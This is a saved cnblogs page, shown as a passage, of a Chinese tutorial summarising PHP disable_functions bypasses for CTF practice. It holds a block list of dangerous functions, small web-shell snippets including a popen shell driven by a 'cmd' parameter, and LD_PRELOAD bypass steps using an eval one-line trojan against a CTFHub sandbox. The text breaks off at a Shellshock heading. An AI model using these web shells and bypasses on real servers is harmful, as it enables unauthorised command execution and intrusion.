@@ -1,0 +1,2005 @@
+<!DOCTYPE html>
+<!-- saved from url=(0049)https://www.cnblogs.com/sakura521/p/15055907.html -->
+<html lang="zh-cn" style="--olcb-folder-code-block-max-height: 80vh; --cnb-code-bg: rgb(245, 245, 245); --cnb-code-font-size: 12px; --cnb-code-color: rgb(68, 68, 68);" mode="dark" theme="b"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="referrer" content="origin-when-cross-origin">
+    <meta name="description" content="零、php需要禁用的函数 phpinfo() 功能描述：输出 PHP 环境信息以及相关的模块、WEB 环境等信息。 危险等级：中 passthru() 功能描述：允许执行一个外部程序并回显输出，类似于 exec()。 危险等级：高 exec() 功能描述：允许执行一个外部程序（如 UNIX Shel">
+    <meta property="og:description" content="零、php需要禁用的函数 phpinfo() 功能描述：输出 PHP 环境信息以及相关的模块、WEB 环境等信息。 危险等级：中 passthru() 功能描述：允许执行一个外部程序并回显输出，类似于 exec()。 危险等级：高 exec() 功能描述：允许执行一个外部程序（如 UNIX Shel">
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>php disable_functions绕过总结 - Ctrl_C+Ctrl_V - 博客园</title>
+    <link id="favicon" rel="shortcut icon" href="https://blog-static.cnblogs.com/files/blogs/563617/logo.ico" type="image/svg+xml">
+    
+    <style>#home :not(.cnblogs_code):not(.cnblogs_Highlighter)>pre:not([highlighted]):not([class*="brush:"]) code:not(.hljs), :not(.cnblogs_code):not(.cnblogs_Highlighter)>pre:not([highlighted]):not([class*="brush:"]) code:not(.hljs) {background: rgb(245, 245, 245);
+        padding: 12px;
+        border: 0.8px solid rgb(204, 204, 204);
+        border-radius: 3px;
+        border-color: transparent;
+        color: rgb(68, 68, 68);
+        font-family: "Courier New", sans-serif;
+        font-size: 12px</style><link rel="stylesheet" href="./php disable_functions绕过总结 - Ctrl_C+Ctrl_V - 博客园_files/blog-common.min.css">
+    
+
+    
+        <link id="highlighter-theme-cnblogs" type="text/css" rel="stylesheet" href="./php disable_functions绕过总结 - Ctrl_C+Ctrl_V - 博客园_files/cnblogs.css">
+    <link type="text/css" rel="stylesheet" href="./php disable_functions绕过总结 - Ctrl_C+Ctrl_V - 博客园_files/custom.css">
+    
+    <link id="mobile-style" media="only screen and (max-width: 767px)" type="text/css" rel="stylesheet" href="./php disable_functions绕过总结 - Ctrl_C+Ctrl_V - 博客园_files/mobile-common.min.css">
+    
+    <link type="application/rss+xml" rel="alternate" href="https://www.cnblogs.com/sakura521/rss">
+    <link type="application/rsd+xml" rel="EditURI" href="https://www.cnblogs.com/sakura521/rsd.xml">
+    <link type="application/wlwmanifest+xml" rel="wlwmanifest" href="https://www.cnblogs.com/sakura521/wlwmanifest.xml">
+    <script>
+        var currentBlogId = 563617;
+        var currentBlogApp = 'sakura521';
+        var isLogined = false;
+        var isBlogOwner = false;
+        var skinName = 'Custom';
+        var visitorUserId = '';
+        var hasCustomScript = true;
+        try {
+            if (hasCustomScript && document.referrer && document.referrer.indexOf('baidu.com') >= 0) {
+                Object.defineProperty(document, 'referrer', { value: '' });
+                Object.defineProperty(Document.prototype, 'referrer', { get: function () { return ''; } });
+            }
+        } catch (error) { }
+        window.cb_enable_mathjax = false;
+        window.mathEngine = 0;
+        window.codeHighlightEngine = 1;
+        window.enableCodeLineNumber = false;
+        window.codeHighlightTheme = 'cnblogs';
+        window.darkModeCodeHighlightTheme = 'vs2015';
+        window.isDarkCodeHighlightTheme = false;
+        window.isDarkModeCodeHighlightThemeDark = true;
+        window.isDisableCodeHighlighter = false;
+        window.enableCodeThemeTypeFollowSystem = false;
+        window.enableMacStyleCodeBlock = false
+    </script>
+        <script>
+            var currentPostDateAdded = '2021-07-24 23:36';
+        </script>
+    <script src="./php disable_functions绕过总结 - Ctrl_C+Ctrl_V - 博客园_files/jquery-2.2.0.min.js.下载"></script>
+    <script src="./php disable_functions绕过总结 - Ctrl_C+Ctrl_V - 博客园_files/blog-common.min.js.下载"></script><style>.medium-zoom-overlay {
+  position: fixed;
+  top: 0;
+  right: 0;
+  bottom: 0;
+  left: 0;
+  opacity: 0;
+  transition: opacity 300ms;
+  will-change: opacity;
+}
+
+.medium-zoom--opened .medium-zoom-overlay {
+  cursor: pointer;
+  cursor: zoom-out;
+  opacity: 1;
+}
+
+.medium-zoom-image {
+  cursor: pointer;
+  cursor: zoom-in;
+  /*
+    The `transition` is marked as "!important" for the animation to happen
+    even though it's overriden by another inline `transition` style attribute.
+
+    This is problematic with frameworks that generate inline styles on their
+    images (e.g. Gatsby).
+
+    See https://github.com/francoischalifour/medium-zoom/issues/110
+   */
+  transition: transform 300ms cubic-bezier(0.2, 0, 0.2, 1) !important;
+}
+
+.medium-zoom-image--hidden {
+  visibility: hidden;
+}
+
+.medium-zoom-image--opened {
+  position: relative;
+  cursor: pointer;
+  cursor: zoom-out;
+  will-change: transform;
+}
+</style><script id="hljs-script" src="./php disable_functions绕过总结 - Ctrl_C+Ctrl_V - 博客园_files/highlight.min.js.下载" type="text/javascript" async=""></script>
+    
+
+    
+<link rel="stylesheet" href="./php disable_functions绕过总结 - Ctrl_C+Ctrl_V - 博客园_files/lightbox.min.css"><style data-id="immersive-translate-input-injected-css">.immersive-translate-input {
+  position: absolute;
+  top: 0;
+  right: 0;
+  left: 0;
+  bottom: 0;
+  z-index: 2147483647;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+}
+
+.immersive-translate-input-loading {
+  --loading-color: #f78fb6;
+  width: 6px;
+  height: 6px;
+  border-radius: 50%;
+  display: block;
+  margin: 12px auto;
+  position: relative;
+  color: white;
+  left: -100px;
+  box-sizing: border-box;
+  animation: immersiveTranslateShadowRolling 1.5s linear infinite;
+}
+
+@keyframes immersiveTranslateShadowRolling {
+  0% {
+    box-shadow: 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0);
+  }
+
+  12% {
+    box-shadow: 100px 0 var(--loading-color), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0);
+  }
+
+  25% {
+    box-shadow: 110px 0 var(--loading-color), 100px 0 var(--loading-color), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0);
+  }
+
+  36% {
+    box-shadow: 120px 0 var(--loading-color), 110px 0 var(--loading-color), 100px 0 var(--loading-color), 0px 0 rgba(255, 255, 255, 0);
+  }
+
+  50% {
+    box-shadow: 130px 0 var(--loading-color), 120px 0 var(--loading-color), 110px 0 var(--loading-color), 100px 0 var(--loading-color);
+  }
+
+  62% {
+    box-shadow: 200px 0 rgba(255, 255, 255, 0), 130px 0 var(--loading-color), 120px 0 var(--loading-color), 110px 0 var(--loading-color);
+  }
+
+  75% {
+    box-shadow: 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 130px 0 var(--loading-color), 120px 0 var(--loading-color);
+  }
+
+  87% {
+    box-shadow: 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 130px 0 var(--loading-color);
+  }
+
+  100% {
+    box-shadow: 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0);
+  }
+}
+</style></head>
+<body class="skin-custom no-navbar hljs-engine">
+    <a name="top"></a>
+    <div id="top_nav" class="navbar forpc navbar-custom">
+        <nav id="nav_main" class="navbar-main">
+            <ul id="nav_left" class="navbar-list navbar-left">
+                <li class="navbar-branding">
+                    <a href="https://www.cnblogs.com/" title="开发者的网上家园" role="banner">
+                        <img src="./php disable_functions绕过总结 - Ctrl_C+Ctrl_V - 博客园_files/logo.svg" alt="博客园Logo">
+                    </a>
+                </li>
+                <li>
+                    <a href="https://www.cnblogs.com/" onclick="countClicks(&#39;skin-navbar-sitehome&#39;)">首页</a>
+                </li>
+                <li>
+                    <a href="https://news.cnblogs.com/" onclick="countClicks(&#39;nav&#39;, &#39;skin-navbar-news&#39;)">新闻</a>
+                </li>
+                <li>
+                    <a href="https://q.cnblogs.com/" onclick="countClicks(&#39;nav&#39;, &#39;skin-navbar-q&#39;)">博问</a>
+                </li>
+                    <li><a href="https://www.cnblogs.com/cmt/p/17489281.html">直播</a></li>
+                <li>
+                    <a href="https://ing.cnblogs.com/" onclick="countClicks(&#39;nav&#39;, &#39;skin-navbar-ing&#39;)">闪存</a>
+                </li>
+                <li>
+                    <a href="https://edu.cnblogs.com/" onclick="countClicks(&#39;nav&#39;, &#39;skin-navbar-edu&#39;)">班级</a>
+                </li>
+            </ul>
+            <ul id="nav_right" class="navbar-list navbar-right">
+                <li>
+                    <form id="zzk_search" class="navbar-search dropdown" action="https://zzk.cnblogs.com/s" method="get" role="search">
+                        <input name="w" id="zzk_search_input" placeholder="代码改变世界" type="search" tabindex="3" autocomplete="off">
+                        <button id="zzk_search_button" onclick="window.navbarSearchManager.triggerActiveOption()">
+                            <img id="search_icon" class="focus-hidden" src="./php disable_functions绕过总结 - Ctrl_C+Ctrl_V - 博客园_files/search.svg" alt="搜索">
+                            <img class="hidden focus-visible" src="./php disable_functions绕过总结 - Ctrl_C+Ctrl_V - 博客园_files/enter.svg" alt="搜索">
+                        </button>
+                        <ul id="navbar_search_options" class="dropdown-menu quick-search-menu">
+                            <li tabindex="0" class="active" onclick="zzkSearch(event, document.getElementById(&#39;zzk_search_input&#39;).value)">
+                                <div class="keyword-wrapper">
+                                    <img src="./php disable_functions绕过总结 - Ctrl_C+Ctrl_V - 博客园_files/search.svg" alt="搜索">
+                                    <div class="keyword"></div>
+                                </div>
+                                <span class="search-area">所有博客</span>
+                            </li>
+                                    <li tabindex="1" onclick="zzkBlogSearch(event, &#39;sakura521&#39;, document.getElementById(&#39;zzk_search_input&#39;).value)">
+                                        <div class="keyword-wrapper">
+                                            <img src="./php disable_functions绕过总结 - Ctrl_C+Ctrl_V - 博客园_files/search.svg" alt="搜索">
+                                            <div class="keyword"></div>
+                                        </div>
+                                        <span class="search-area">当前博客</span>
+                                    </li>
+                        </ul>
+                    </form>
+                </li>
+                <li id="navbar_login_status" class="navbar-list">
+                    <a class="navbar-user-info navbar-blog" href="https://i.cnblogs.com/EditPosts.aspx?opt=1" alt="写随笔" title="写随笔" style="display: none;">
+                        <img id="new_post_icon" class="navbar-icon" src="./php disable_functions绕过总结 - Ctrl_C+Ctrl_V - 博客园_files/newpost.svg" alt="写随笔">
+                    </a>
+                    <a id="navblog-myblog-icon" class="navbar-user-info navbar-blog" href="https://passport.cnblogs.com/GetBlogApplyStatus.aspx" alt="我的博客" title="我的博客" style="display: none;">
+                        <img id="myblog_icon" class="navbar-icon" src="./php disable_functions绕过总结 - Ctrl_C+Ctrl_V - 博客园_files/myblog.svg" alt="我的博客">
+                    </a>
+                    <a class="navbar-user-info navbar-message navbar-icon-wrapper" href="https://msg.cnblogs.com/" alt="短消息" title="短消息" style="display: none;">
+                        <img id="msg_icon" class="navbar-icon" src="./php disable_functions绕过总结 - Ctrl_C+Ctrl_V - 博客园_files/message.svg" alt="短消息">
+                        <span id="msg_count" style="display: none"></span>
+                    </a>
+                    <a id="navbar_lite_mode_indicator" data-current-page="blog" style="display: none" href="javascript:void(0)" alt="简洁模式" title="简洁模式启用，您在访问他人博客时会使用简洁款皮肤展示">
+                        <img class="navbar-icon" src="./php disable_functions绕过总结 - Ctrl_C+Ctrl_V - 博客园_files/lite-mode-on.svg" alt="简洁模式">
+                    </a>
+                    <div id="user_info" class="navbar-user-info dropdown" style="display: none;">
+                        <a class="dropdown-button" href="https://home.cnblogs.com/">
+                            <img id="user_icon" class="navbar-avatar" src="./php disable_functions绕过总结 - Ctrl_C+Ctrl_V - 博客园_files/avatar-default.svg" alt="用户头像">
+                        </a>
+                        <div class="dropdown-menu">
+                            <a id="navblog-myblog-text" href="https://passport.cnblogs.com/GetBlogApplyStatus.aspx">我的博客</a>
+                            <a href="https://home.cnblogs.com/">我的园子</a>
+                            <a href="https://account.cnblogs.com/settings/account">账号设置</a>
+                            <a href="javascript:void(0)" id="navbar_lite_mode_toggle" title="简洁模式会使用简洁款皮肤显示所有博客">
+    简洁模式 <img id="navbar_lite_mode_on" src="./php disable_functions绕过总结 - Ctrl_C+Ctrl_V - 博客园_files/lite-mode-check.svg" class="hide" style="display: none;"><span id="navbar_lite_mode_spinner" class="hide">...</span>
+</a>
+                            <a href="javascript:void(0)" onclick="account.logout();">退出登录</a>
+                        </div>
+                    </div>
+                    <a class="navbar-anonymous" href="https://account.cnblogs.com/signup" style="display: inline;">注册</a>
+                    <a class="navbar-anonymous" href="javascript:void(0);" onclick="account.login()" style="display: inline;">登录</a>
+                </li>
+            </ul>
+        </nav>
+    </div>
+
+    <div id="page_begin_html">
+        <div class="dark-loading" style="display: none;">
+  <div class="box">
+    <h2>Loading</h2>
+    <span></span><span></span><span></span><span></span><span></span><span></span><span></span>
+  </div>
+</div>
+    </div>
+
+    <!--done-->
+<div id="home">
+<div id="header"><div class="esa-mobile-menu"><i class="fa fa-bars"></i></div>
+	<div id="blogTitle">
+        <a id="lnkBlogLogo" href="https://www.cnblogs.com/sakura521/"><img id="blogLogo" src="./php disable_functions绕过总结 - Ctrl_C+Ctrl_V - 博客园_files/logo.gif" alt="返回主页"></a>		
+		
+<!--done-->
+<h1><a id="Header1_HeaderTitle" class="headermaintitle HeaderMainTitle" href="https://www.cnblogs.com/sakura521/">Ctrl_C+Ctrl_V's Blog</a>
+</h1>
+<h2></h2>
+
+
+
+
+		
+	</div><!--end: blogTitle 博客的标题和副标题 -->
+	<div id="navigator">
+		
+<ul id="navList">
+<li><a id="blog_nav_sitehome" class="menu" href="https://www.cnblogs.com/">
+博客园</a>
+</li>
+<li>
+<a id="blog_nav_myhome" class="menu" href="https://www.cnblogs.com/sakura521/">
+首页</a>
+</li><li><a class="menu" target="_blank" href="https://github.com/esofar/cnblogs-theme-silence/">标签</a></li>
+<li>
+
+<a id="blog_nav_newpost" class="menu" href="https://i.cnblogs.com/EditPosts.aspx?opt=1">
+新随笔</a>
+</li>
+<li>
+<a id="blog_nav_contact" class="menu" href="https://msg.cnblogs.com/send/Ctrl_C%2BCtrl_V">
+联系</a></li>
+
+<li>
+<a id="blog_nav_admin" class="menu" href="https://i.cnblogs.com/">
+管理</a>
+</li>
+</ul>
+
+
+		<div class="blogStats">
+			<span id="stats_post_count">随笔 - 84&nbsp; </span>
+<span id="stats_article_count">文章 - 20&nbsp; </span>
+<span id="stats-comment_count">评论 - 2&nbsp; </span>
+<span id="stats-total-view-count">阅读 - 
+<span title="总阅读数: 30579">
+30579</span></span>
+
+		</div><!--end: blogStats -->
+	</div><!--end: navigator 博客导航栏 -->
+</div><!--end: header 头部 -->
+<div id="main">
+	<div id="mainContent">
+	<div class="forFlow">
+		<div id="post_detail">
+    <!--done-->
+    <div id="topics">
+        <div class="post">
+            <h1 class="postTitle">
+                
+<a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/sakura521/p/15055907.html">
+    <span role="heading" aria-level="2">php disable_functions绕过总结</span>
+    
+
+</a><button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button>
+
+            </h1>
+            <div class="clear"></div>
+            <div class="postBody">
+                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
+<h3 id="零php需要禁用的函数">零、php需要禁用的函数<button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button><a href="https://www.cnblogs.com/sakura521/p/15055907.html#%E9%9B%B6php%E9%9C%80%E8%A6%81%E7%A6%81%E7%94%A8%E7%9A%84%E5%87%BD%E6%95%B0" class="esa-anchor" style="opacity: 0;">#</a></h3>
+<pre class="highlighter-hljs" highlighted="true"><code class="hljsln highlighter-hljs hljs language-erlang"><span class="hljs-function"><span class="hljs-title">phpinfo</span><span class="hljs-params">()</span> 
+
+功能描述：输出 PHP 环境信息以及相关的模块、WEB 环境等信息。 
+
+危险等级：中 
+
+<span class="hljs-title">passthru</span><span class="hljs-params">()</span> 
+
+功能描述：允许执行一个外部程序并回显输出，类似于 <span class="hljs-title">exec</span><span class="hljs-params">()</span>。 
+
+危险等级：高 
+
+<span class="hljs-title">exec</span><span class="hljs-params">()</span> 
+
+功能描述：允许执行一个外部程序（如 UNIX S<span class="hljs-title">hell</span> 或 CMD 命令等）。 
+
+危险等级：高 
+
+<span class="hljs-title">system</span><span class="hljs-params">()</span> 
+
+功能描述：允许执行一个外部程序并回显输出，类似于 <span class="hljs-title">passthru</span><span class="hljs-params">()</span>。 
+
+危险等级：高 
+
+<span class="hljs-title">chroot</span><span class="hljs-params">()</span> 
+
+功能描述：可改变当前 PHP 进程的工作根目录，仅当系统支持 CLI 模式 
+
+PHP 时才能工作，且该函数不适用于 W<span class="hljs-title">indows</span> 系统。 
+
+危险等级：高 
+
+<span class="hljs-title">scandir</span><span class="hljs-params">()</span> 
+
+功能描述：列出指定路径中的文件和目录。 
+
+危险等级：中 
+
+<span class="hljs-title">chgrp</span><span class="hljs-params">()</span> 
+
+功能描述：改变文件或目录所属的用户组。 
+
+危险等级：高 
+
+<span class="hljs-title">chown</span><span class="hljs-params">()</span> 
+
+功能描述：改变文件或目录的所有者。 
+
+危险等级：高 
+
+<span class="hljs-title">shell_exec</span><span class="hljs-params">()</span> 
+
+功能描述：通过 S<span class="hljs-title">hell</span> 执行命令，并将执行结果作为字符串返回。 
+
+危险等级：高 
+
+<span class="hljs-title">proc_open</span><span class="hljs-params">()</span> 
+
+功能描述：执行一个命令并打开文件指针用于读取以及写入。 
+
+危险等级：高 
+
+<span class="hljs-title">proc_get_status</span><span class="hljs-params">()</span> 
+
+功能描述：获取使用 <span class="hljs-title">proc_open</span><span class="hljs-params">()</span> 所打开进程的信息。 
+
+危险等级：高 
+
+<span class="hljs-title">error_log</span><span class="hljs-params">()</span> 
+
+功能描述：将错误信息发送到指定位置（文件）。 
+
+安全备注：在某些版本的 PHP 中，可使用 <span class="hljs-title">error_log</span><span class="hljs-params">()</span> 绕过 PHP <span class="hljs-title">safe</span> <span class="hljs-title">mode</span>， 
+
+执行任意命令。 
+
+危险等级：低 
+
+<span class="hljs-title">ini_alter</span><span class="hljs-params">()</span> 
+
+功能描述：是 <span class="hljs-title">ini_set</span><span class="hljs-params">()</span> 函数的一个别名函数，功能与 <span class="hljs-title">ini_set</span><span class="hljs-params">()</span> 相同。 
+
+具体参见 <span class="hljs-title">ini_set</span><span class="hljs-params">()</span>。 
+
+危险等级：高 
+
+<span class="hljs-title">ini_set</span><span class="hljs-params">()</span> 
+
+功能描述：可用于修改、设置 PHP 环境配置参数。 
+
+危险等级：高 
+
+<span class="hljs-title">ini_restore</span><span class="hljs-params">()</span> 
+
+功能描述：可用于恢复 PHP 环境配置参数到其初始值。 
+
+危险等级：高 
+
+<span class="hljs-title">dl</span><span class="hljs-params">()</span> 
+
+功能描述：在 PHP 进行运行过程当中（而非启动时）加载一个 PHP 外部模块。 
+
+危险等级：高 
+
+<span class="hljs-title">pfsockopen</span><span class="hljs-params">()</span> 
+
+功能描述：建立一个 I<span class="hljs-title">nternet</span> 或 UNIX 域的 <span class="hljs-title">socket</span> 持久连接。 
+
+危险等级：高 
+
+<span class="hljs-title">syslog</span><span class="hljs-params">()</span> 
+
+功能描述：可调用 UNIX 系统的系统层 <span class="hljs-title">syslog</span><span class="hljs-params">()</span> 函数。 
+
+危险等级：中 
+
+<span class="hljs-title">readlink</span><span class="hljs-params">()</span> 
+
+功能描述：返回符号连接指向的目标文件内容。 
+
+危险等级：中 
+
+<span class="hljs-title">symlink</span><span class="hljs-params">()</span> 
+
+功能描述：在 UNIX 系统中建立一个符号链接。 
+
+危险等级：高 
+
+<span class="hljs-title">popen</span><span class="hljs-params">()</span> 
+
+功能描述：可通过 <span class="hljs-title">popen</span><span class="hljs-params">()</span> 的参数传递一条命令，并对 <span class="hljs-title">popen</span><span class="hljs-params">()</span> 所打开的文件进行执行。 
+
+危险等级：高 
+
+<span class="hljs-title">stream_socket_server</span><span class="hljs-params">()</span> 
+
+功能描述：建立一个 I<span class="hljs-title">nternet</span> 或 UNIX 服务器连接。 
+
+危险等级：中 
+
+<span class="hljs-title">putenv</span><span class="hljs-params">()</span> 
+
+功能描述：用于在 PHP 运行时改变系统字符集环境。在低于 5.2.6 版本的 PHP 中，可利用该函数 
+
+修改系统字符集环境后，利用 <span class="hljs-title">sendmail</span> 指令发送特殊参数执行系统 SHELL 命令。 
+
+危险等级：高 
+
+
+
+禁用方法如下： 
+
+打开/<span class="hljs-title">etc</span>/<span class="hljs-title">php</span>.<span class="hljs-title">ini</span>文件， 
+
+查找到 <span class="hljs-title">disable_functions</span> ，添加需禁用的函数名，如下： 
+
+<span class="hljs-title">phpinfo</span>,<span class="hljs-title">eval</span>,<span class="hljs-title">passthru</span>,<span class="hljs-title">exec</span>,<span class="hljs-title">system</span>,<span class="hljs-title">chroot</span>,<span class="hljs-title">scandir</span>,<span class="hljs-title">chgrp</span>,<span class="hljs-title">chown</span>,<span class="hljs-title">shell_exec</span>,<span class="hljs-title">proc_open</span>,<span class="hljs-title">proc_get_status</span>,<span class="hljs-title">ini_alter</span>,<span class="hljs-title">ini_alter</span>,<span class="hljs-title">ini_restore</span>,<span class="hljs-title">dl</span>,<span class="hljs-title">pfsockopen</span>,<span class="hljs-title">openlog</span>,<span class="hljs-title">syslog</span>,<span class="hljs-title">readlink</span>,<span class="hljs-title">symlink</span>,<span class="hljs-title">popepassthru</span>,<span class="hljs-title">stream_socket_server</span>,<span class="hljs-title">fsocket</span>,<span class="hljs-title">fsockopen</span>
+</span></code></pre>
+<h3 id="一常规绕过">一、常规绕过<button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button><a href="https://www.cnblogs.com/sakura521/p/15055907.html#%E4%B8%80%E5%B8%B8%E8%A7%84%E7%BB%95%E8%BF%87" class="esa-anchor">#</a></h3>
+<pre class="highlighter-hljs" highlighted="true"><code class="hljsln highlighter-hljs hljs language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">'whoami'</span>);<span class="hljs-meta">?&gt;</span>
+
+<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">'whoami'</span>);<span class="hljs-meta">?&gt;</span>
+
+<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">'whoami'</span>);<span class="hljs-meta">?&gt;</span>
+
+<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">passthru</span>(<span class="hljs-string">"whoami"</span>);<span class="hljs-meta">?&gt;</span>
+
+<span class="hljs-meta">&lt;?php</span>
+
+<span class="hljs-variable">$command</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'cmd'</span>];
+
+<span class="hljs-variable">$handle</span> = <span class="hljs-title function_ invoke__">popen</span>(<span class="hljs-variable">$command</span> , <span class="hljs-string">"r"</span>);
+
+<span class="hljs-keyword">while</span>(!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$handle</span>)) { 
+
+<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$handle</span>, <span class="hljs-number">1024</span>);
+
+}
+
+<span class="hljs-title function_ invoke__">pclose</span>(<span class="hljs-variable">$handle</span>);<span class="hljs-meta">?&gt;</span>
+
+<span class="hljs-meta">&lt;?php</span>
+
+<span class="hljs-variable">$command</span>=<span class="hljs-string">"ipconfig"</span>; 
+
+<span class="hljs-variable">$descriptorspec</span> = <span class="hljs-keyword">array</span>(<span class="hljs-number">1</span> =&gt; <span class="hljs-keyword">array</span>(<span class="hljs-string">"pipe"</span>, <span class="hljs-string">"w"</span>)); 
+
+<span class="hljs-variable">$handle</span> = <span class="hljs-title function_ invoke__">proc_open</span>(<span class="hljs-variable">$command</span> ,<span class="hljs-variable">$descriptorspec</span> , <span class="hljs-variable">$pipes</span>); 
+
+<span class="hljs-keyword">while</span>(!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>])) { 
+
+<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>], <span class="hljs-number">1024</span>);}
+
+<span class="hljs-meta">?&gt;</span>
+
+<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">passthru</span>(<span class="hljs-string">"whoami"</span>);<span class="hljs-meta">?&gt;</span>
+</code></pre>
+<h3 id="二利用环境变量ld_preload绕过">二、利用环境变量LD_PRELOAD绕过<button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button><a href="https://www.cnblogs.com/sakura521/p/15055907.html#%E4%BA%8C%E5%88%A9%E7%94%A8%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8Fld_preload%E7%BB%95%E8%BF%87" class="esa-anchor">#</a></h3>
+<h4 id="1mail">1、mail<button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button><a href="https://www.cnblogs.com/sakura521/p/15055907.html#1mail" class="esa-anchor">#</a></h4>
+<pre class="highlighter-hljs" highlighted="true"><code class="hljsln highlighter-hljs hljs language-bash">1、漏洞环境:
+
+https://www.ctfhub.com/<span class="hljs-comment">#/skilltree</span>
+
+2、前提条件:
+
+1. 能够上传自己的.so文件
+
+2. 能够控制环境变量的值（设置LD_PRELOAD变量），比如putenv函数
+
+3. 存在可以控制PHP启动外部程序的函数并能执行（因为新进程启动将加载LD_PRELOAD中的.so文件），比如mail()、imap_mail()、mb_send_mail()和error_log()等
+
+3、基本原理
+
+利用环境变量 LD_PRELOAD 劫持系统函数，让外部程序加载恶意 *.so，达到执行系统命令的效果。
+
+4、工具下载地址
+
+https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD
+
+5、利用步骤
+
+a.将bypass_disablefunc_x64.so传入tmp目录下
+
+b.将bypass_disablefunc.php传入tmp目录下
+
+c.然后利用一句话木马，包含bypass_disablefunc.php从而执行cmd命令
+
+http://challenge-44c0c4efa761bc9b.sandbox.ctfhub.com:10800/index.php/?ant=<span class="hljs-built_in">eval</span>(<span class="hljs-variable">$_GET</span>[1]);&amp;1=include(%27/tmp/bypass_disablefunc.php%27);&amp;cmd=<span class="hljs-built_in">whoami</span>&amp;outpath=/tmp/1.txt&amp;sopath=/tmp/bypass_disablefunc_x64.so
+</code></pre>
+<p>该环境禁用了如下的function：</p>
+<pre class="highlighter-hljs" highlighted="true"><code class="hljsln highlighter-hljs hljs language-perl">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,<span class="hljs-keyword">exec</span>,shell_exec,popen,proc_open,passthru,<span class="hljs-keyword">symlink</span>,<span class="hljs-keyword">link</span>,syslog,imap_open,dl,mail,<span class="hljs-keyword">system</span>
+</code></pre>
+<h4 id="2error_log">2、error_log<button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button><a href="https://www.cnblogs.com/sakura521/p/15055907.html#2error_log" class="esa-anchor">#</a></h4>
+<pre class="highlighter-hljs" highlighted="true"><code class="hljsln highlighter-hljs hljs language-bash">将上述mail例子中的mail(<span class="hljs-string">""</span>, <span class="hljs-string">""</span>, <span class="hljs-string">""</span>, <span class="hljs-string">""</span>);替换为error_log(<span class="hljs-string">""</span>,1,<span class="hljs-string">""</span>,<span class="hljs-string">""</span>);
+</code></pre>
+<h4 id="3mb_send_mail">3、mb_send_mail<button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button><a href="https://www.cnblogs.com/sakura521/p/15055907.html#3mb_send_mail" class="esa-anchor">#</a></h4>
+<pre class="highlighter-hljs" highlighted="true"><code class="hljsln highlighter-hljs hljs language-bash">将上述mail例子中的mail(<span class="hljs-string">""</span>, <span class="hljs-string">""</span>, <span class="hljs-string">""</span>, <span class="hljs-string">""</span>);替换为mb_send_mail()(<span class="hljs-string">""</span>,1,<span class="hljs-string">""</span>,<span class="hljs-string">""</span>);
+</code></pre>
+<h4 id="4可以利用蚁剑插件绕过disable_functions">4、可以利用蚁剑插件(绕过disable_functions)<button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button><a href="https://www.cnblogs.com/sakura521/p/15055907.html#4%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E8%9A%81%E5%89%91%E6%8F%92%E4%BB%B6%E7%BB%95%E8%BF%87disable_functions" class="esa-anchor">#</a></h4>
+<p>将生成新的shell名为，.antproxy.php,连接即可。</p>
+<h3 id="三shellshock">三、shellshock<button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button><a href="https://www.cnblogs.com/sakura521/p/15055907.html#%E4%B8%89shellshock" class="esa-anchor">#</a></h3>
